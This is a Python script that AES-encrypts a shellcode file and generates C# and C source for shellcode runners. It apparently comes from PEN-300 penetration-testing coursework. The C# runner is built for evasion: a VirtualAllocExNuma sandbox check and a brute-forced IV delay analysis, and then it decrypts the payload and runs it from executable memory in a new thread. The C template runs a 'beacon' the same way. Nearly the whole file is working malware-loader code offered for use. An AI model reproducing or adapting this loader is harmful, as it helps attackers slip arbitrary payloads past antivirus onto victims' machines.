from base64 import encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

TEMPLATE = """
#include <windows.h>

unsigned char beacon_bin[] = { %s };
unsigned int beacon_bin_len = %s;

uint8_t iv { %s };
uint8_t key { %s };

int main()
{
    void *exec = VirtualAlloc(0, beacon_bin_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, beacon_bin, beacon_bin_len);
	((void(*)())exec)();

    return 0;
}
"""

CSTEMPLATE = """
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;

namespace ShellcodeRunner
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();
        public static byte[] DecryptAES(byte[] buffer, byte[] key, byte[] iv, byte[] OGhash, int origLen)
        {
            // Check arguments.
            if (buffer == null || buffer.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (key == null || key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (iv == null || key.Length <= 0)
                throw new ArgumentNullException("IV");
            byte[] test = new byte[origLen];
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                using (MemoryStream msDecrypt = new MemoryStream(buffer))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {

                        csDecrypt.Read(test, 0, origLen);
                        HashAlgorithm sha = SHA256.Create();
                        byte[] result = sha.ComputeHash(test, 0, origLen);
                        bool bEqual = false;
                        if (result.Length == OGhash.Length)
                        {
                            int i = 0;
                            while ((i < result.Length) && (result[i] == OGhash[i]))
                            {
                                i += 1;
                            }
                            if (i == result.Length)
                            {
                                bEqual = true;
                            }
                        }
                        if (bEqual)
                            return test;
                        else
                            return null;
                    }
                }
            }
        }

        static void Main(string[] args)
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            { return; }
            // keys to decrypt
            byte[] iv = { %s };
            byte[] key = { %s };
            byte[] OG_hash = { 
                0x5D, 0x47, 0xBE, 0xC7, 0xC5, 0x46, 0x15, 0x4F, 0x74, 0xB6, 0x2B, 0xFC, 0x80, 0x1F, 0x38, 0x42, 
                0x3E, 0xA0, 0x80, 0x01, 0x2E, 0xBA, 0xC7, 0x3C, 0x79, 0x89, 0xE1, 0x3A, 0x94, 0x03, 0x93, 0x40  
            };
            // base_beeaconn sttattic
            byte[] buf = new byte[%s]{ %s };
            for (byte i = 0x01;i< 0xff; i++)
            {
                iv[14] = i;
                for (byte j = 1; j < 0xff; j++)
                {
                    iv[15] = j;
                    if (DecryptAES(buf, key, iv, OG_hash, 299) != null) // OG len and encrypted len are different
                    {
                        byte[] shellcode = DecryptAES(buf, key, iv, OG_hash, 299);
                        int size = shellcode.Length;
                        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
                        Marshal.Copy(shellcode, 0, addr, size);
                        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                        WaitForSingleObject(hThread, 0xFFFFFFFF);
                        return;
                    } else
                    {
                        Console.WriteLine("[!] Decryption Failed");
                    }
                }
            }
            return; 
        }
    }
}
"""

TEMPLATEC = """

#define PAYLOAD_HASH //ADD
#define ENCRYPTED_BIN_LEN %s
#define OG_PAYLOAD_LEN %s

uint8_t iv[]  = { %s };
uint8_t key[] = { %s };

unsigned char encrypted_instructions[] = { 
  %s
};
"""


def format_shellcode(shellcode):
    hshellcode = ""

    code_size = len(shellcode)

    for num, byte in enumerate(shellcode):
        if num != code_size - 1:
            hshellcode += f"{hex(byte)},"
        else:
            hshellcode += f"{hex(byte)}"

    return hshellcode

# uint8_t iv { 0xa9, 0x0f, 0x55, 0x21, 0xb5, 0x34, 0x5f, 0x93, 0x8a, 0xf7, 0x96, 0x38, 0x7e, 0x39, 0x5c, 0x75 };
# uint8_t key { 0x56, 0xbb, 0xf4, 0x12, 0x3d, 0x38, 0x64, 0xe3, 0x3e, 0x88, 0xfa, 0xe2, 0x05, 0xa3, 0x64, 0x70 };

# takes extracted shellcode for stage rcode 
data = b"rcode"

# read the key from config TODO add generate and write key routine to the stager build pipeline
with open("/root/PEN-300/popnotepad64.bin", "rb") as file:
    data = file.read()
key = b'\x2b\x7e\x15\x16\x28\xae\xd2\xa6\xab\xf7\x15\x88\x09\xcf\x4f\x3c' #get_random_bytes(16)
iv = b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f'  # get_random_bytes(16)
cipher = AES.new(key=key, mode=AES.MODE_CBC, iv=iv, )
ct_bytes = cipher.encrypt(pad(data, AES.block_size))
with open("/root/PEN-300/python-gen-out.bin", "wb") as outputf:
    outputf.write(ct_bytes)

e_shc = format_shellcode(ct_bytes)
k_ = format_shellcode(key)
iv_ = format_shellcode(iv) 
forco = CSTEMPLATE % (iv_, k_, len(ct_bytes), e_shc)
with open("/tmp/somefile.cs", "w") as f:
   f.write(forco)